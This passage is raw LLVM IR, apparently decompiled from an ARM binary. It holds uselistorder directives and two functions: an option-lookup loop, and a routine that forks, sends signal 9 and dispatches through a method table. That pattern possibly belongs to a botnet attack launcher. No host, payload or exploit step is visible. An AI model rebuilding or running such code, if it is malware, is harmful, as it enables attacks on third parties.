  uselistorder i32 %v5_9264, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_924c.v4_9234, { 1, 0, 2 }
  uselistorder i1 %v7_9210, { 1, 0 }
  uselistorder i1 %v7_9190, { 1, 0 }
  uselistorder i32 %v5_918c, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9174.v4_915c, { 1, 0, 2 }
  uselistorder i1 %v7_913c, { 1, 0 }
  uselistorder i1 %v7_9110, { 1, 0 }
  uselistorder i1 %v7_90e8, { 1, 0 }
  uselistorder i32 %v0_90a4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_9074, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_900c, { 1, 0 }
  uselistorder i32 %v2_9000, { 1, 0 }
  uselistorder i32 %v1_9000, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8ff4, { 1, 0 }
  uselistorder i32 %v3_8fd8, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v2_8fb8, { 1, 0 }
  uselistorder i32 %v2_8fac, { 1, 0 }
  uselistorder i32 %v1_8fac, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8fa0, { 1, 0 }
  uselistorder i32 %v3_8f84, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i1 %v7_8f40, { 1, 0 }
  uselistorder i32 %v5_8f1c, { 1, 2, 3, 0 }
  uselistorder i1 %v7_8f04, { 1, 0 }
  uselistorder i32 %v3_8ee8, { 1, 0 }
  uselistorder i32 %v0_8ea4, { 1, 0 }
  uselistorder i32 %v3_8e70, { 4, 5, 6, 3, 1, 2, 0 }
  uselistorder i32* %v2_8e70, { 1, 0 }
  uselistorder i32 %v0_8e70, { 1, 0 }
  uselistorder i32 %v3_8e58, { 1, 0, 2 }
  uselistorder i32 %v0_8e4c, { 1, 2, 0 }
  uselistorder i32 %storemerge46, { 1, 0 }
  uselistorder i1 %v7_8dc8, { 1, 0 }
  uselistorder i32 %v4_8dbc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8d8c, { 1, 0 }
  uselistorder i32 %v2_8d80, { 1, 0 }
  uselistorder i32 %v2_8d74, { 1, 0 }
  uselistorder i32 %v1_8d74, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8d68, { 1, 0 }
  uselistorder i32 %v3_8d4c, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v3_8cc8, { 0, 2, 1 }
  uselistorder i32 %v2_8ca0, { 1, 0 }
  uselistorder i32 %v1_8ca0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8ca0, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v1_8c8c, { 1, 0 }
  uselistorder i32 %v3_8c6c, { 1, 0, 2 }
  uselistorder i32 %v1_8bd0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8a74, { 1, 0 }
  uselistorder i32 %v3_8854, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8800, { 2, 1, 0, 3 }
  uselistorder i32 %v3_87fc, { 1, 0 }
  uselistorder i32 %v3_87f0, { 2, 0, 1 }
  uselistorder i1 %v7_87dc, { 1, 0 }
  uselistorder i32 %v3_87d4, { 3, 2, 1, 0, 4, 5 }
  uselistorder i1 %v7_87ac, { 1, 0 }
  uselistorder i1 %v7_87a4, { 1, 0 }
  uselistorder i32 %v3_8788, { 1, 0 }
  uselistorder i32 %v1_8768, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8768, { 0, 2, 1 }
  uselistorder i32 %v2_8764, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8750, { 1, 0, 2 }
  uselistorder i32 %v1_8710, { 1, 0 }
  uselistorder i32 %v2_86f0, { 1, 0 }
  uselistorder i32 %v1_86f0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_86e4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_86f0, { 4, 1, 2, 5, 3, 0 }
  uselistorder i32 %v3_86d4, { 1, 0 }
  uselistorder i32 %v3_86c8, { 1, 0, 2 }
  uselistorder i1 %v7_8624, { 1, 0 }
  uselistorder i32 %v3_8620, { 1, 3, 2, 0, 4, 5 }
  uselistorder i1 %v7_85fc, { 1, 0 }
  uselistorder i32 %v4_85d4, { 2, 1, 0 }
  uselistorder i8 %v3_85d4, { 11, 12, 13, 14, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_85d4, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8878, { 4, 2, 3, 1, 0, 5 }
  uselistorder i1 %v7_859c, { 1, 0 }
  uselistorder i32 %v1_859c, { 1, 0 }
  uselistorder i1 %v7_8594, { 1, 0 }
  uselistorder i1 %v7_858c, { 1, 0 }
  uselistorder i1 %v7_8584, { 1, 0 }
  uselistorder i32 %v1_8584, { 1, 0 }
  uselistorder i1 %v7_857c, { 1, 0 }
  uselistorder i1 %v7_8574, { 1, 0 }
  uselistorder i32 %v1_8558, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v2_84f8, { 2, 1, 0, 3, 5, 4, 6 }
  uselistorder i8* %v1_88b8, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_86d8, { 0, 15, 1, 2, 16, 3, 17, 4, 18, 5, 19, 6, 20, 7, 21, 8, 22, 23, 9, 24, 10, 13, 11, 14, 12, 25 }
  uselistorder i32 %stack_var_-20860.0.ph, { 58, 59, 57, 0, 61, 60, 1, 56, 55, 2, 64, 63, 3, 68, 67, 4, 66, 65, 5, 62, 6, 79, 78, 7, 77, 76, 8, 75, 74, 9, 73, 72, 10, 71, 11, 70, 69, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 45, 17, 44, 43, 18, 42, 19, 41, 40, 20, 39, 38, 21, 37, 36, 22, 35, 34, 23, 33, 24, 32, 31, 25, 30, 29, 26, 27, 28 }
  uselistorder i32 %v2_84b0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_84a4, { 1, 0, 2 }
  uselistorder i32 %v0_8498, { 1, 0 }
  uselistorder i32 %v0_8484, { 1, 0, 2 }
  uselistorder i32 %v2_83f4, { 1, 0 }
  uselistorder i32 %v5_83f0, { 1, 0 }
  uselistorder i32 %v2_83b0, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_839c, { 4, 5, 19, 15, 16, 17, 2, 3, 18, 0, 1, 14, 10, 11, 12, 13, 20, 8, 9, 7, 6 }
  uselistorder i32 %v0_8390, { 0, 1, 3, 2 }
  uselistorder i1 %v2_8320, { 1, 0, 2 }
  uselistorder i32* %v11_82f4, { 1, 0, 2 }
  uselistorder i32 %v10_82f0, { 23, 22, 21, 13, 12, 19, 18, 17, 20, 16, 15, 30, 29, 28, 31, 27, 26, 14, 25, 24, 11, 10, 9, 34, 33, 32, 40, 39, 38, 36, 37, 35, 45, 44, 43, 42, 41, 8, 7, 6, 5, 4, 3, 2, 1, 0, 46, 47 }
  uselistorder i32 %v2_82e8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_82d8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_82c8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_82a0, { 1, 0, 2 }
  uselistorder i8* %v3_829c, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9, 10, 11, 12 }
  uselistorder i32 %v3_828c, { 1, 0, 2 }
  uselistorder i32 %v2_8278, { 0, 29, 37, 36, 39, 38, 1, 32, 2, 33, 3, 34, 35, 40, 4, 28, 5, 6, 30, 31, 41, 7, 26, 8, 27, 9, 42, 10, 11, 24, 25, 43, 12, 21, 13, 22, 23, 44, 14, 15, 19, 20, 45, 46, 47, 16, 48, 50, 49, 52, 51, 54, 53, 56, 55, 18, 17, 57 }
  uselistorder i32 %v6_81f8, { 3, 2, 4, 0, 8, 7, 6, 1, 5, 9 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 43, 41, 42 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 11, 10, 12, 3, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 74, 38, 39, 40, 41, 42, 43, 44, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 159, 160, 161, 162, 163, 164, 165, 166, 139, 140, 141, 142, 143, 144, 145, 146, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 86, 85, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 109, 106, 107, 108, 110, 111, 112, 116, 117, 113, 114, 115, 118, 119, 120, 121, 122, 123, 124, 125, 128, 126, 127, 130, 129, 2, 132, 133, 131, 1, 134, 135, 136, 137, 138, 156, 157, 158, 147, 148, 149, 150, 151, 152, 153, 154, 155, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 91, 92, 93, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 75, 73, 76, 77, 79, 78, 80, 81, 82, 83, 84, 85, 86, 87, 88, 1, 89, 90, 103, 104, 105, 94, 95, 96, 97, 98, 99, 100, 101, 102, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 75, 26, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 62, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 165, 163, 164, 166, 167, 168, 169, 170, 171, 172, 173, 174, 147, 148, 149, 150, 151, 152, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 126, 125, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 1, 141, 142, 143, 144, 145, 146, 161, 162, 153, 154, 155, 156, 157, 158, 160, 159, 0 }
  uselistorder i32* %r0.global-to-local, { 18, 17, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 42, 30, 29, 31, 130, 43, 149, 32, 78, 53, 44, 46, 45, 47, 49, 48, 51, 50, 54, 52, 55, 57, 56, 58, 60, 59, 62, 61, 66, 63, 64, 65, 68, 67, 69, 70, 72, 71, 73, 74, 75, 77, 76, 80, 79, 81, 83, 82, 84, 87, 85, 86, 89, 88, 92, 90, 91, 94, 93, 96, 95, 98, 97, 99, 100, 101, 103, 102, 104, 106, 105, 108, 107, 109, 110, 111, 34, 113, 112, 115, 114, 116, 118, 117, 119, 120, 121, 123, 122, 125, 124, 126, 128, 127, 129, 131, 132, 134, 133, 136, 135, 137, 140, 138, 139, 142, 141, 144, 143, 145, 147, 146, 148, 150, 151, 152, 153, 154, 155, 157, 156, 33, 158, 160, 159, 162, 161, 164, 163, 167, 165, 166, 169, 168, 170, 172, 171, 173, 176, 174, 175, 178, 177, 180, 179, 181, 183, 182, 184, 319, 318, 320, 321, 322, 324, 323, 326, 325, 327, 329, 328, 330, 332, 331, 333, 334, 335, 9, 336, 338, 337, 339, 341, 340, 342, 344, 343, 345, 8, 346, 347, 283, 285, 284, 37, 36, 286, 287, 35, 288, 4, 185, 186, 187, 189, 188, 190, 192, 191, 194, 193, 195, 197, 196, 199, 198, 200, 202, 201, 203, 204, 205, 5, 206, 3, 207, 2, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 264, 263, 265, 266, 1, 267, 6, 268, 7, 270, 269, 41, 272, 271, 275, 273, 274, 10, 16, 276, 277, 15, 278, 14, 40, 279, 280, 39, 281, 282, 38, 13, 315, 12, 316, 317, 11, 289, 291, 290, 292, 293, 294, 296, 295, 297, 298, 300, 299, 302, 301, 304, 303, 306, 305, 308, 307, 309, 310, 311, 312, 313, 314, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 59, 51, 52, 53, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0, 50, 58, 54, 55, 56, 57 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 54, 53, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 129, 130, 131, 132, 133, 68, 69, 70, 71, 72, 73, 81, 74, 75, 76, 77, 78, 79, 80, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 100, 99, 101, 102, 107, 109, 108, 103, 104, 105, 106, 110, 111, 112, 113, 114, 115, 123, 124, 116, 117, 118, 119, 120, 121, 122, 125, 0, 126, 127, 128, 142, 143, 134, 135, 136, 137, 138, 139, 140, 141 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 59, 57, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 135, 136, 137, 138, 139, 73, 74, 75, 76, 77, 78, 85, 79, 80, 81, 82, 83, 84, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 111, 113, 112, 107, 108, 109, 110, 114, 115, 116, 117, 118, 119, 120, 128, 129, 121, 122, 123, 124, 125, 126, 127, 130, 0, 131, 132, 133, 134, 149, 150, 151, 140, 141, 142, 143, 144, 145, 146, 147, 148 }
  uselistorder i32 49, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 51, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 50, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_19808.48 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_197f8.44 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_197f0.42 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_197e4.40 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 -20773, { 1, 0, 2, 4, 3, 8, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_197ec.38 to i32), { 2, 4, 3, 5, 1, 6, 0, 7 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 35, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_197c4.26 to i32), { 0, 2, 1, 3 }
  uselistorder i32 10240, { 2, 5, 3, 6, 4, 7, 0, 8, 1, 9 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 19, 20 }
  uselistorder i32 1452, { 1, 0 }
  uselistorder i32 789, { 2, 0, 1, 3 }
  uselistorder i32 1431, { 1, 2, 0, 3 }
  uselistorder i32 533, { 1, 0, 2, 3, 4 }
  uselistorder i32 3140, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 10241, { 1, 0 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_197cc.19 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_9df8, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_9cbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9c9c, { 2, 0, 1 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %dec_label_pc_9ac8, { 1, 0 }
  uselistorder label %.thread41, { 1, 0 }
  uselistorder label %dec_label_pc_9a9c, { 2, 0, 1 }
  uselistorder label %.thread38, { 1, 0 }
  uselistorder label %dec_label_pc_9a00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_991c, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder label %dec_label_pc_98d0, { 1, 0 }
  uselistorder label %dec_label_pc_98a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_989c, { 1, 0 }
  uselistorder label %bb194, { 1, 0 }
  uselistorder label %bb192, { 1, 0 }
  uselistorder label %bb189, { 1, 0 }
  uselistorder label %dec_label_pc_95bc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_959c, { 1, 0 }
  uselistorder label %dec_label_pc_94d0, { 1, 0 }
  uselistorder label %dec_label_pc_94c8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_94a0, { 1, 0 }
  uselistorder label %dec_label_pc_9464, { 1, 0 }
  uselistorder label %bb185, { 1, 0 }
  uselistorder label %bb183, { 1, 0 }
  uselistorder label %bb181, { 1, 0 }
  uselistorder label %dec_label_pc_9378, { 2, 1, 0 }
  uselistorder label %bb179, { 1, 0 }
  uselistorder label %.thread25, { 3, 0, 1, 2 }
  uselistorder label %bb176, { 1, 0 }
  uselistorder label %.thread24, { 3, 0, 1, 2 }
  uselistorder label %bb173, { 1, 0 }
  uselistorder label %.thread23, { 1, 0 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_90ac, { 1, 0 }
  uselistorder label %dec_label_pc_8f64, { 1, 0 }
  uselistorder label %dec_label_pc_8e34, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8e0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d9c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8d40, { 6, 1, 2, 7, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8d14, { 1, 0 }
  uselistorder label %dec_label_pc_8ce4, { 1, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %dec_label_pc_8c4c, { 1, 0 }
  uselistorder label %dec_label_pc_8c34, { 1, 0 }
  uselistorder label %dec_label_pc_8bf8, { 1, 0 }
  uselistorder label %dec_label_pc_8b84, { 1, 0 }
  uselistorder label %dec_label_pc_8b4c, { 1, 0 }
  uselistorder label %dec_label_pc_8884, { 1, 0, 2 }
  uselistorder label %dec_label_pc_87b4, { 8, 9, 10, 11, 12, 13, 1, 2, 7, 15, 0, 14, 3, 6, 4, 5 }
  uselistorder label %dec_label_pc_877c, { 1, 0 }
  uselistorder label %dec_label_pc_8700, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_85bc, { 5, 3, 4, 0, 6, 1, 2, 7 }
  uselistorder label %dec_label_pc_8538.dec_label_pc_8538_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8510.dec_label_pc_8510_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_84f4, { 3, 0, 2, 1, 4 }
  uselistorder label %dec_label_pc_84f4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8498, { 1, 0 }
  uselistorder label %dec_label_pc_8440, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_82fc, { 1, 0 }
  uselistorder label %dec_label_pc_82b4, { 1, 3, 4, 0, 2 }
}

define i32 @function_9f04(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_9f04:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_9f04 = icmp eq i32 %arg1, 0
  br i1 %v2_9f04, label %dec_label_pc_9f4c, label %dec_label_pc_9f14

dec_label_pc_9f14:                                ; preds = %dec_label_pc_9f04
  %v0_9f14 = load i32, i32* %r1.global-to-local, align 4
  %v1_9f14 = add i32 %v0_9f14, 4
  %v2_9f14 = inttoptr i32 %v1_9f14 to i8*
  %v3_9f14 = load i8, i8* %v2_9f14, align 1
  %v4_9f14 = zext i8 %v3_9f14 to i32
  %v9_9f18 = icmp eq i32 %v4_9f14, %arg3
  br i1 %v9_9f18, label %dec_label_pc_9f58, label %dec_label_pc_9f3c.preheader

dec_label_pc_9f3c.preheader:                      ; preds = %dec_label_pc_9f14
  br label %dec_label_pc_9f3c

dec_label_pc_9f2c:                                ; preds = %dec_label_pc_9f3c
  %v1_9f2c = add i32 %v0_9f34.in, 12
  %v2_9f2c = inttoptr i32 %v1_9f2c to i8*
  %v3_9f2c = load i8, i8* %v2_9f2c, align 1
  %v4_9f2c = zext i8 %v3_9f2c to i32
  %v9_9f30 = icmp eq i32 %v4_9f2c, %arg3
  br i1 %v9_9f30, label %dec_label_pc_9f58, label %dec_label_pc_9f3c

dec_label_pc_9f3c:                                ; preds = %dec_label_pc_9f3c.preheader, %dec_label_pc_9f2c
  %v0_9f34.in = phi i32 [ %v0_9f14, %dec_label_pc_9f3c.preheader ], [ %v0_9f34, %dec_label_pc_9f2c ]
  %v0_9f3c = phi i32 [ 0, %dec_label_pc_9f3c.preheader ], [ %v1_9f3c, %dec_label_pc_9f2c ]
  %v0_9f34 = add i32 %v0_9f34.in, 8
  %v1_9f3c = add i32 %v0_9f3c, 1
  %v9_9f40 = icmp eq i32 %v1_9f3c, %arg1
  store i32 %v0_9f34, i32* %r1.global-to-local, align 4
  br i1 %v9_9f40, label %dec_label_pc_9f4c, label %dec_label_pc_9f2c

dec_label_pc_9f4c:                                ; preds = %dec_label_pc_9f3c, %dec_label_pc_9f04, %dec_label_pc_9f58
  %v0_9f4c = phi i32 [ %arg4, %dec_label_pc_9f04 ], [ %v2_9f58, %dec_label_pc_9f58 ], [ %arg4, %dec_label_pc_9f3c ]
  ret i32 %v0_9f4c

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9f2c, %dec_label_pc_9f14
  %v0_9f58 = phi i32 [ %v0_9f14, %dec_label_pc_9f14 ], [ %v0_9f34, %dec_label_pc_9f2c ]
  %v1_9f58 = inttoptr i32 %v0_9f58 to i32*
  %v2_9f58 = load i32, i32* %v1_9f58, align 4
  br label %dec_label_pc_9f4c

; uselistorder directives
  uselistorder i32 %v1_9f3c, { 1, 0 }
  uselistorder i32 %v0_9f34, { 1, 0, 2 }
  uselistorder i32 %v0_9f34.in, { 1, 0 }
  uselistorder i32 %v0_9f14, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9f4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9f3c, { 1, 0 }
}

define i32 @function_9f60(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_9f60:
  %stack_var_-32 = alloca i32, align 4
  %v3_9f60 = load i32, i32* @r4, align 4
  store i32 %v3_9f60, i32* %stack_var_-32, align 4
  %v6_9f60 = load i32, i32* @r5, align 4
  %v9_9f60 = load i32, i32* @r6, align 4
  %v12_9f60 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  %v0_9f78 = call i32 @function_14c98()
  %v7_9f7c = icmp eq i32 %v0_9f78, -1
  %tmp23 = icmp slt i32 %v0_9f78, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_9f60
  br label %dec_label_pc_9f9c

bb24:                                             ; preds = %dec_label_pc_9f60
  %. = zext i1 %v7_9f7c to i32
  store i32 %., i32* @r5, align 4
  %v2_9f94 = icmp eq i1 %v7_9f7c, false
  br i1 %v2_9f94, label %dec_label_pc_9fa4, label %dec_label_pc_9f9c

dec_label_pc_9f9c:                                ; preds = %.thread2, %bb24
  %v2_9f9c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_9f9c, i32* @r4, align 4
  store i32 %v6_9f60, i32* @r5, align 4
  store i32 %v9_9f60, i32* @r6, align 4
  store i32 %v12_9f60, i32* @r7, align 4
  ret i32 %v0_9f78

dec_label_pc_9fa4:                                ; preds = %bb24
  %v0_9fa4 = call i32 @function_14c98()
  %v7_9fa8 = icmp eq i32 %v0_9fa4, -1
  store i32 %v0_9fa4, i32* @r4, align 4
  br i1 %v7_9fa8, label %dec_label_pc_9fd8, label %dec_label_pc_9fb4

dec_label_pc_9fb4:                                ; preds = %dec_label_pc_9fa4
  %v2_9fb4 = icmp eq i32 %v0_9fa4, 0
  br i1 %v2_9fb4, label %dec_label_pc_9fbc, label %dec_label_pc_9fe0

dec_label_pc_9fbc:                                ; preds = %dec_label_pc_9fb4
  %v0_9fbc = load i32, i32* @r6, align 4
  %v1_9fc0 = call i32 @function_15c58(i32 %v0_9fbc)
  store i32 %v1_9fc0, i32* @r0, align 4
  %v0_9fc4 = call i32 @function_15bd4()
  store i32 %v0_9fc4, i32* @r0, align 4
  %v2_9fcc = call i32 @function_14e24(i32 %v0_9fc4, i32 9)
  %v0_9fd0 = load i32, i32* @r4, align 4
  %v1_9fd4 = call i32 @function_12f30(i32 %v0_9fd0)
  br label %dec_label_pc_9fd8

dec_label_pc_9fd8:                                ; preds = %dec_label_pc_9fa4, %dec_label_pc_9fbc
  %v0_9fd8 = load i32, i32* @r5, align 4
  %v1_9fdc = call i32 @function_12f30(i32 %v0_9fd8)
  br label %dec_label_pc_9fe0

dec_label_pc_9fe0:                                ; preds = %dec_label_pc_9fb4, %dec_label_pc_9fd8
  %v2_9fe4 = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_9fe4 = zext i8 %v2_9fe4 to i32
  %v2_9fe8 = icmp eq i8 %v2_9fe4, 0
  br i1 %v2_9fe8, label %dec_label_pc_a02c, label %dec_label_pc_9ff0

dec_label_pc_9ff0:                                ; preds = %dec_label_pc_9fe0
  %v2_9ff4 = load i32, i32* @global_var_22378.55, align 4
  %v1_9ff8 = inttoptr i32 %v2_9ff4 to i32*
  %v2_9ff8 = load i32, i32* %v1_9ff8, align 4
  %v1_9ffc = add i32 %v2_9ff8, 4
  %v2_9ffc = inttoptr i32 %v1_9ffc to i8*
  %v3_9ffc = load i8, i8* %v2_9ffc, align 1
  %v4_9ffc = zext i8 %v3_9ffc to i32
  %v1_a000 = load i32, i32* @r7, align 4
  %v9_a000 = icmp eq i32 %v4_9ffc, %v1_a000
  br i1 %v9_a000, label %dec_label_pc_a034, label %dec_label_pc_a020.preheader

dec_label_pc_a020.preheader:                      ; preds = %dec_label_pc_9ff0
  %v1_a004 = load i32, i32* @r5, align 4
  br label %dec_label_pc_a020

dec_label_pc_a010:                                ; preds = %dec_label_pc_a020
  %v4_a010 = mul i32 %v1_a020, 4
  %v5_a010 = add i32 %v4_a010, %v2_9ff4
  %v6_a010 = inttoptr i32 %v5_a010 to i32*
  %v7_a010 = load i32, i32* %v6_a010, align 4
  %v1_a014 = add i32 %v7_a010, 4
  %v2_a014 = inttoptr i32 %v1_a014 to i8*
  %v3_a014 = load i8, i8* %v2_a014, align 1
  %v4_a014 = zext i8 %v3_a014 to i32
  %v9_a018 = icmp eq i32 %v4_a014, %v1_a000
  br i1 %v9_a018, label %dec_label_pc_a034, label %dec_label_pc_a020

dec_label_pc_a020:                                ; preds = %dec_label_pc_a020.preheader, %dec_label_pc_a010
  %v0_a020 = phi i32 [ %v1_a004, %dec_label_pc_a020.preheader ], [ %v1_a020, %dec_label_pc_a010 ]
  %v1_a020 = add i32 %v0_a020, 1
